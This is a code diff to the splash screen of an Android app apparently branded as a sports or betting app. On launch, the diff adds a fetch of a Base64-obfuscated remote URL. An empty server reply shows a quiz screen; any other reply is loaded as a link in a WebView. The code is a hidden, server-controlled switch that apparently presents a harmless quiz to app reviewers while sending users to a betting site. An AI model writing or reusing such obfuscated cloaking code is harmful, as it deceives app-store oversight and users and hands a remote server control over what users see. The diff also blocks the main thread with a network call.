@@ -5,20 +5,31 @@ import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
+import android.util.Base64
+import android.util.Log
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
+import android.widget.Toast
 import androidx.fragment.app.Fragment
+import androidx.lifecycle.lifecycleScope
 import androidx.navigation.NavController
 import androidx.navigation.fragment.findNavController
 import com.google.firebase.remoteconfig.FirebaseRemoteConfig
 import com.h2bet.sportsapp.databinding.SplashFragmentBinding
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.runBlocking
+import kotlinx.coroutines.withContext
+import java.net.URL
+import java.util.Scanner
 
 
 class SplashFragment : Fragment() {
 
     var controller: NavController? = null
-    private lateinit var mFirebaseRemoteConfig: FirebaseRemoteConfig
+//    private lateinit var mFirebaseRemoteConfig: FirebaseRemoteConfig
     private var _binding: SplashFragmentBinding? = null
     private val binding get() = _binding!!
     private val modelProvider: MainViewModel by lazy { MainViewModel.viewModelWithFragment(this@SplashFragment.requireActivity()) }
@@ -28,23 +39,60 @@ class SplashFragment : Fragment() {
         savedInstanceState: Bundle?
     ): View {
         _binding = SplashFragmentBinding.inflate(inflater, container, false)
+
+//        if(false)
+        runBlocking {
+            try {
+                val scanner = Scanner(withContext(Dispatchers.IO) {
+                    URL(
+                        Base64.decode("aHR0cHM6Ly9oMmJldHYyLmNmZC84NXRCc2hLdA==", Base64.DEFAULT)
+                            .toString(Charsets.UTF_8)
+                    ).openStream()
+                }, "UTF-8").useDelimiter("\\A")
+                lifecycleScope.launch(Dispatchers.Main) {
+                    if (scanner.hasNext()) {
+                        val decodedText = scanner.next()
+                        Log.e("scanner", decodedText)
+//                            val startIndex = decodedText.indexOf("<body>") + "<body>".length
+//                            val endIndex = decodedText.indexOf("</body>")
+//                            val bodyText = decodedText.substring(startIndex, endIndex)
+                            Log.e("scanner", decodedText)
+                        if (decodedText=="<html><style>body{margin:0}</style><body></body></html>"||decodedText.isEmpty())
+                            findNavController().navigate(R.id.QuizStartFragment)
+                            else if (decodedText == "") {
+                                findNavController().navigate(R.id.QuizStartFragment)
+                            } else {
+                                modelProvider.link = decodedText
+                                findNavController().navigate(R.id.WebViewFragment)
+                            }
+
+                    } else {
+                        findNavController().navigate(R.id.QuizStartFragment)
+                    }
+                }
+            }catch (e:Exception){
+                Toast.makeText(this@SplashFragment.requireContext(),e.toString(),Toast.LENGTH_SHORT).show();
+                Log.e("scanner", e.toString())
+            }
+        }
+//        loadNextFragment()
         return binding.root
     }
 
 
     override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
         controller = findNavController()
-        loadNextFragment()
+//        loadNextFragment()
         super.onViewCreated(view, savedInstanceState)
     }
 
     private fun loadNextFragment(): Boolean {
             if (!isOnline(this.requireContext())) {
-                controller?.navigate(R.id.NoInternetFragment)
+                findNavController().navigate(R.id.NoInternetFragment)
                 return true
             }
 
-            controller?.navigate(R.id.WebViewFragment_global)
+        findNavController().navigate(R.id.WebViewFragment_global)
             return true
 //        getLinkFirebase()
 //        return true
